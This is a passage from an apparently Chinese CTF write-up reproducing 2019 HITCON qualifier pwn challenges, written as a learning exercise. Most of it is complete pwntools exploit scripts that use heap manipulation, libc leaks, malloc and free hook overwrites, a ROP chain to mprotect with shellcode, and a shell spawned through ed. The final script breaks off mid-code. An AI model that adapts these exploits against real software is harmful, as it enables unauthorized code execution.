bin遍历来将最大的0x410的chunk归为。但是这个思路同样也遇到了坑点：</p><p>unsorted bin进行归类chunk到smallbin或largebin时候的一个小trick：两个相同size的chunk在unsorted bin时，分配一个不会将另一个归类。在释放排布适合的时候，两个不同size的chunk时，一个分配另一个才会归类。</p><p>如图：此时我们需要分配0x400的chunk：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/8.png"></div>只有按照这种释放链才会将0x410归类，因为他可能先遍历的是先释放的0x410，当发现0x410不满足最佳适应原则是就将其归类到largebin。之前先释放0x400再释放0x410，导致没有办法归类0x410的chunk。<h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./one_punch"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./one_punch"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.29.so"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0xC388</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#---------fill 0x400 tcache &amp;&amp; leak heap and libc------</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hero name: "</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x000055555555a660</span><span class="token operator">+</span><span class="token number">0x555555559000</span>success<span class="token punctuation">(</span><span class="token string">"heap address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hero name: "</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7fb2ca0</span><span class="token operator">+</span><span class="token number">0x7ffff7dce000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x210</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>rename<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>rename<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#---------------------------------------------------------------</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>rename<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x140</span><span class="token operator">+</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>backdoor<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>backdoor<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x8cfd6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># add rsp 0x48</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x000000000012bda6</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x6000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"mprotect"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x6000</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="trick-or-treat"><a href="#trick-or-treat" class="headerlink" title="trick_or_treat"></a>trick_or_treat</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/9.png"></div>canary没开启。<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>题目逻辑很简单，创建一个任意大小的chunk，然后任意地址向后写入。这个题很熟悉，马上就想到了分配一个大于0x23000 size的chunk其偏移和libc地址是固定的，但是为了让heap在libc地址上面，所以我们最后找到的size是0x400000。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>好了，接下来就是思路了：<br>1.想到改hook，但是又想到只有一次malloc的机会并且无释放的操作。所以想到是不是前几天虎符一样，可以改libc中某个地址为one_gadget最后call过去。最后发现没有这个地址。<br>2.由于没有关闭错误输出缓冲流，所以想到了写入不可写的地址来触发标准错误输出，但是也不行<br>3.想到了改hook，通过scanf的大量输入流来触发重新分配和释放chunk，来getshell。</p><p>第三个思路：发现改malloc_hook和free_hook为one_gadget都不能成功，没办法了，请教google了。最后是改free_hook为system，最后输入!/bin/sh来getshell。<br>但是由于在输入的时候我们不能输入16进制数以外的数字，所以我们需要绕过一下：ed是一个旧的默认Unix控制台编辑器。通常ed是提供给用户，它功能非常简单，但它仍然有内部的第三方命令执行功能，非常类似于vim。一旦进，ed,我们可以通过执行!’/bin/sh’来获取正常的shell，如下所示</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/10.png"></div>那么我们就申请的大内存中覆盖__free_hook为system,然后通过ed执行shell（亲测改malloc_hook不能成功）<pre class="line-numbers language-python"><code class="language-python">p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Offset &amp; Value:\x00"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Offset &amp; Value:\x00"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">"ed"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'!/bin/sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>现在我们说明一下，scanf缓冲区的分配：（说明了即使设置了setvbuf也可以强行分配heap缓冲区）</p><p>If you pass a very large input into scanf, it will internally call both malloc and free to create a temporary buffer for your input on the heap.就是说这个缓冲区是即分配即使用，即释放的。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0xe569f</span><span class="token punctuation">,</span><span class="token number">0xe5858</span><span class="token punctuation">,</span><span class="token number">0xe585f</span><span class="token punctuation">,</span><span class="token number">0xe5863</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">,</span><span class="token number">0x10a398</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./trick_or_treat"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./trick_or_treat"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Magic:0x"</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"heap address ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> heap_addr<span class="token number">-0x7ffff75e3010</span><span class="token operator">+</span><span class="token number">0x7ffff79e4000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span>heap_addrsuccess<span class="token punctuation">(</span><span class="token string">"offset ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Offset &amp; Value:\x00"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Offset &amp; Value:\x00"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">"ed"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'!/bin/sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="crypto-in-the-shell"><a href="#crypto-in-the-shell" class="headerlink" title="crypto_in_the_shell"></a>crypto_in_the_shell</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/11.png"></div>保护全开。<h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/12.png"></div>程序逻辑不难，简单的溢出，然后做一个AES加密，再打印出来。由于没有溢出检查，而且还是int型，那么就意味着我们可以上溢也可以下溢。<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>我们需要得到这么几个值：1.libc地址 2.返回地址.这些都可以通过上溢出和下溢出来得到，得到之后将返回栈地址的值改为one_gadget就可以了。</p><p>详细讲解：<br>1.首先通过上溢出得到AESkey和iv的值，这样的话就可以通过python自带的解密函数来进行decode得到真实值。<br>2.上溢出到stdout got表来得到libc地址。<br>3.上溢出到data段的起始位置，那里有data段的地址，通过这个地址减去整个data段在elf文件中的偏移，就可以得到程序加载基址<br>4.得到加载基址后加上elf.symbols[“buf”]，便可以得到我们写数据的基址，那么我们就方便下面地址任意写和任意读<br>5.通过下溢出environ得到栈地址，得到全局变量times参数的地址和返回地址。<br>6.首先改times的值，这样可以方便我们不断的加密爆破到我们想要的one_gadget地址。（不怎么了解AES这个加密方式）<br>7.由于times要被改为负数才能成功，所以1/2的成功率<br>8.最后爆破改ret地址为one_gadget<br>9.调试发现environ的值最后会写道执行execve的rdx中导致执行失败，所以我们要将environ改为“\0”*8</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding="utf-8"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AESp <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getInfo</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"offset:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">&amp;</span> <span class="token number">0xfffffff0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>iv<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    instance <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span>iv<span class="token punctuation">)</span>    <span class="token keyword">return</span> instance<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak key and iv</span>result <span class="token operator">=</span> getInfo<span class="token punctuation">(</span><span class="token number">0xffffffffffffffe0</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>key <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x10</span><span class="token punctuation">]</span>iv <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># leak libc</span>result <span class="token operator">=</span> getInfo<span class="token punctuation">(</span><span class="token number">0xffffffffffffffc0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>data <span class="token operator">=</span> decode<span class="token punctuation">(</span>key<span class="token punctuation">,</span>iv<span class="token punctuation">,</span>result<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak binary address</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>result <span class="token operator">=</span> getInfo<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0xfffffffffffffff0</span><span class="token operator">-</span><span class="token number">0x390</span><span class="token punctuation">)</span><span class="token 